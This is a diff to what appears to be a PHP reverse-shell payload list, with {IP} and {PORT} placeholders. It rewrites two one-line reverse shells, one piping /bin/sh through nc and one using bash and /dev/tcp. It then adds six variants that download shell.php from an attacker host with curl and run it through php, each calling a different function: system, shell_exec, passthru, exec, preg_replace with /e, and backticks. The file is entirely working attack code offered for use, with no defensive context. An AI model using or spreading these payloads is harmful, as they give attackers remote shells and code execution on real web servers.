@@ -290,15 +290,36 @@ function printit ($string) {
 
 #EXAMPLE
 
-<?php
-    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f');
-?>
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f'); ?>
 
 #EXAMPLE
 
-<?php
-    exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'");
-?>
+<?php exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
+
+#EXAMPLE
+
+<?php system("curl http://{IP}/shell.php|php"); ?>
+
+#EXAMPLE
+
+<?php shell_exec("curl http://{IP}/shell.php|php"); ?>
+
+#EXAMPLE
+
+<?php passthru("curl http://{IP}/shell.php|php"); ?>
+
+#EXAMPLE
+
+<?php exec("curl http://{IP}/shell.php|php"); ?>
+
+#EXAMPLE
+
+<?php preg_replace('/.*/e', 'system("curl http://{IP}/shell.php|php");', ''); ?>
+
+#EXAMPLE
+
+<?php $output = `curl http://{IP}/shell.php|php`; echo "<pre>$output</pre>"; ?>
+
 
 #INDEX
 
